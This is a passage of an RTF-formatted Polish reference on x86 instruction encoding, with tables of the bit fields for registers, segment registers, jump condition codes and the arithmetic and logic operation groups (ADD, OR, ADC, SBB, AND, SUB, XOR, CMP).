\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}001}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ECX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}010}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EBX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}011}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EDX}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}100}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}-}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}101}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EBP}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}110}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ESI}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx4687\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}111}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EDI}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Sg - opisuje rodzaj segmentu u\uc1\u380\'bfytego w operacji.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Mo\uc1\u380\'bfliwe warto\uc1\u347\'9cci Sg to: 00=ES, 01=CS, 10=SS, 11=DS}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Seg - rozszerzone Sg (uwzgl\uc1\u281\'eadnia FS i GS).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Mo\uc1\u380\'bfliwe warto\uc1\u347\'9cci Seg to: 000=ES, 001=CS, 010=SS, 011-DS, 100=FS, 101-GS}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wwww - okre\uc1\u347\'9cla r\'f3\uc1\u380\'bfne warunki wyst\uc1\u281\'eapuj\uc1\u261\'b9ce w skokach lub rozkazach SRTxxxx i mo\uc1\u380\'bfe przyjmowa\uc1\u263\'e6 warto\uc1\u347\'9cci przedstawione w poni\uc1\u380\'bfszej tabeli:}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:2.5876in/; table-sdh:89efd40}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Warto\uc1\u347\'9c\uc1\u263\'e6            Warunek }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0000        O - overflow}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0001        NO - not overflow}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0010        C-carry}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0011        NC-notcarry}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0100        Z-zero}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0101        NZ-not zero}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0110        NA-notabove}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0111        A-above}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1000        S-sign}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1001        NS-notsign}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:11; bot-attach:12; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1010        P-parity}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:12; bot-attach:13; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1011        NP-notparity}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:13; bot-attach:14; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1100        L-less}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:14; bot-attach:15; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1101        NL-not less}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:15; bot-attach:16; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1110        NG-notgreat}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:16; bot-attach:17; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx3670
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}1111        G-great}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ope - u\uc1\u380\'bfywane przez niekt\'f3re instrukcje do okre\uc1\u347\'9clania operacji matematycznej lub logicznej, kt\'f3r\uc1\u261\'b9 ma instrukcja wykona\uc1\u263\'e6.}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7154in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/; table-sdh:89f0e68}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Ope}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}001}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}010}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}011}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}100}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}101}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}110}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}111}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ADD}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}OR}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ADC}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SBB}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}AND}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SUB}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}XOR}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CMP}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Op2 - tworzy podgrup\uc1\u281\'ea operacji wykonywanych przez instrukcje o bajcie pocz\uc1\u261\'b9tkowym =82/83 (jest to zrnniejszona lista Ope).}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7154in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/; table-sdh:89bd998}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Ope2}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}001}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}010}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}011}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}100}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}101}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}110}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}111}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ADD}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ADC}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SBB}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SUB}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CMP}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Op3 - opisuje grup\uc1\u281\'ea instrukcji o pierwszym kodzic=F6/F7.}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7154in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/0.7161in/; table-sdh:89bf008}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx974\clvertalt\cltxlrtb    \cellx2005\clvertalt\cltxlrtb    \cellx3036\clvertalt\cltxlrtb    \cellx4068\clvertalt\cltxlrtb    \cellx5099\clvertalt\cltxlrtb    \cellx6130\clvertalt\cltxlrtb    \cellx7161\clvertalt\cltxlrtb    \cellx8192\clvertalt\cltxlrtb    \cellx9224
